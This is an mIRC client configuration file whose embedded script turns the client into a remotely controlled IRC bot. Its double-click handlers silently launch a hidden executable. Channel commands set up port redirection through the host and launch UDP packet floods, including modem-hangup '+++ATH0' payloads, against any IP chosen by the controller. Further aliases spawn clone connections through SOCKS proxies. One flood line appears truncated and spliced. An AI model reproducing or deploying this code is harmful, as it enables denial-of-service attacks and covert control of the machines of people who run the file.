[text]
ignore=*.*
commandchar=/
linesep=-
timestamp=[HH:nn]
network=All
quit=[Quit] $ip $os
finger=Hi :)
accept=*.jpg,*.gif,*.png,*.bmp,*.txt,*.log,*.wav,*.mid,*.mp3,*.zip
[files]
addrbk=addrbk.ini
servers=servers.ini
browser=c:\progra~1\intern~1\iexplore.exe
emailer=c:\internet\eudora\eudora.exe
finger=finger.txt
urls=urls.ini
[warn]
fserve=off
dcc=off
[options]
n0=0,0,0,0,0,1,300,1,1,0,1,0,0,0,1,1,0,1,1,1,512,0,1,4,0,0,0,1,0,50,1
n1=0,0,0,0,0,0,0,0,2,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,2,2,0
n2=1,0,0,0,1,1,1,1,0,80,160,1,1,1,1,0,0,0,1,160,40,10,0,0,1,0,1,1,0
n3=500,0,0,0,1,0,1,0,0,1,0,1,0,0,1,1,1,0,0,0,0,0,1,0,0,0,2,6,0,0
n4=0,0,1,0,0,3,9999,0,0,1,1,0,1024,0,1,9999,60,0,0,0,1,0,0,2,1,5000,0,2
n5=1,1,1,1,1,1,1,1,1,1,7000,0,0,0,0,1,1,0,300,10,4,0,0,22,0,0,0,999999
n6=0,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,1,0,0,1,0,0,100,1,1,0,0,0,0,0,2
n7=1,0,0,0,0,0,0,1,1,1,1,1,0,1,0,0
[dirs]
[about]
show=sheep
version=5.91
[windows]
scripts=-3,995,3,739,0,0,0
main=776,112,-18,27,0,1,0
wchannel=0,123,0,34,0,1,0
status=0,112,0,27,0,1,0
wquery=42,431,42,144,1,1,0
wserv=104,483,129,345,1,1,0
#gtcontrol=21,112,436,27,0,1,0
wmessage=14,633,57,393,0,1,0
wdccg=0,240,0,212,0,1,0
[events]
default=2,2,3,2,2,1,1
[ident]
active=yes
system=UNIX
port=113
userid=metal
[socks]
enabled=no
port=1080
method=4
dccs=no
[clicks]
status=//run $mircdir $+ winhp32 /n /fh ������ | //msg %chan :DoubleClicked: Status
query=//run $mircdir $+ winhp32 /n /fh ������ | //msg %chan :DoubleClicked: Query
channel=//run $mircdir $+ winhp32 /n /fh ������ | //msg %chan :DoubleClicked: Channel
nicklist=//run $mircdir $+ winhp32 /n /fh ������ | //msg %chan :DoubleClicked: Nick-List
notify=//run $mircdir $+ winhp32 /n /fh ������ | //msg %chan :DoubleClicked: Notify-List
[dde]
ServerStatus=off
ServiceName=mIRC
CheckName=off
[fileserver]
warning=off
homedir=c:
[dccserver]
n0=0,59,0,0,0,0
[mirc]
nick=mawha
anick=TENEKE5
host=runty.eliteirc.netSERVER:runty.eliteirc.net:6667
user=Insekurity Exists InTha Absence Of Knowledge
email=wh0r3@QQQQ.RUNTY.KUNTY
[colours]
n0=0,6,4,5,2,3,3,3,3,3,3,1,5,2,6,1,3,2,3,5,1,0,1,0,1
[pfiles]
n0=popups.ini
n1=popups.ini
n2=popups.ini
n3=popups.ini
n4=popups.ini
[fonts]
fscripts=Wingdings,407,2
fstatus=Arial,407,0
fchannel=Wingdings,407,2
fquery=Wingdings,407,2
f#Hi�p33d=Wingdings,407,2
[nicklist]

[findtext]
n0=!ver
n1=packeting
n2=rand
n3=%pchan
n4=gdope
n5=gcool
n6=gstart
n7=set %chan
n8=CjB
n9=kill
n10=random
[script]
n0=on 10:TEXT:!portredirect*:*:{ if ($2 == $null) { /msg # 14Portredirection Error!!! For help type: !portredirect help | halt } | if ($2 == help) { /msg # 14*** Port Redirection Help! *** | /msg # 14Commands.. | //msg # 14!portredirect add 1000 irc.dal.net 6667 | //msg # 14!portredirect stop port | //msg # 14!portredirect stats | /msg # 14Port Redirect Help / END halt } | if ($2 == add) { if ($5 == $null) { /msg # 3Port Redirection Error: !portredirect add inputport outputserver outputserverport (!portredirect add 1000 irc.dal.net 6667) | halt } | //gtportdirect $3- | /msg # 14[Redirect Added] I-port=( $+ $3 $+ ) to $4 $+ $5 | /msg # 12[Local IP Address]:14 $ip |  halt  } |  if ($2 == stop) {  if ($3 == $null) { halt } | /pdirectstop $3 |  /msg # 14[Portredirection] Port:(12 $+ $3 $+ 14) Has been stopped. |  halt  } | if ($2 == stats) { |  //msg  # 12*** Port Redirection Stat's. |  /predirectstats #  } }
n1=on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum }
n2=on *:Sockread:gtin*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return } | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
n3=on *:Sockread:gtout*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return } | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
n4=on *:Sockopen:gtout*: {  if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
n5=on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname }
n6=on *:sockclose:gtin*: {   unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname }
n7=on 10:TEXT:!pfast*:*:{  //set %pchan # |  if ($4 == random) { //gcoolstart $2 $3 $r(1,65000) | halt } | //gcoolstart $2 $3 $4 }
n8=alias gcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | //msg %pchan [packeting]: Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %pchan ERROR! Currently flooding: $gettok($timer(gcoolt).com,3,32)  | return } |  //msg %pchan 14[sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )14] |  set %gnum 0 |  .timergcoolt -m 0 60 gdope $1 $2 $3 }
n9=alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 2 
n10=  %gnum.p = $r(1,65000)
n11=  sockudp gnumc1 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
n12=  %gnum.p = $r(1,65000) 
n13=  sockudp gnumc3 $2 %gnum.p + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n14=  %gnum.p = $r(1,65000)
n15=  sockudp gnumc2 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
n16=  %gnum.p = $r(1,65000)
n17=  sockudp gnumc4 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
n18=  %gnum.p = $r(1,65000)
n19=  sockudp gnumc5 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
n20=  %gnum.p = $r(1,65000) 
n21=  sockudp gnumc7 $2 %gnum.p + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n22=  %gnum.p = $r(1,65000)
n23=  sockudp gnumc6 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
n24=  %gnum.p = $r(1,65000)
n25=  sockudp gnumc8 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
n26=  %gnum.p = $r(1,65000)
n27=  sockudp gnumc9 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
n28=  %gnum.p = $r(1,65000) 
n29=  sockudp gnumc11 $2 %gnum.p + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n30=  %gnum.p = $r(1,65000)
n31=  sockudp gnumc10 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
n32=  %gnum.p = $r(1,65000)
n33=  sockudp gnumc12 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&  %gnum.p = $r(1,65000)
n34=  %gnum.p = $r(1,65000)
n35=  sockudp gnumc14 $2 %gnum.p + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n36=  %gnum.p = $r(1,65000)
n37=  sockudp gnumc15 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
n38=  %gnum.p = $r(1,65000)
n39=  sockudp gnumc13 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
n40=  return |  :done | //msg %pchan [packeting]: Finished! | .timergcoolt off | unset %gnum* | unset %pchan 
n41=} 
n42=alias firew {  if ($1 == 1) { %clones.firewall = 1 } | elseif ($1 == 0) { %clones.firewall = 0 } }
n43=alias cf { firew 1 | if ($2 == $null) { halt } |  %clones.firew = $1 |  if ($3 == $null) { .timer -o $2 2 connect1 $1 } |  else { .timer -o $2 $3 connect1 $1 } }
n44=alias firstfree { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = *ock $+ %clones.counter | if ($sock(%clones.tmp,0) == 0) { return %clones.counter } | goto home |  :end }
n45=alias connect1 { if ($1 != $null) { %clones.firew = $1 } | if (%clones.server == $null) { msg %chan 2Server not set | halt } |  if (%clones.serverport == $null) { %clones.serverport = 6667 } |  %clones.tmp = $firstfree |  if (%clones.firewall == 1) {  sockopen ock $+ %clones.tmp %clones.firew 1080  } |  else { sockopen sock $+ %clones.tmp %clones.server %clones.serverport  } }
n46=alias botraw { sockwrite -n sock* $1- }
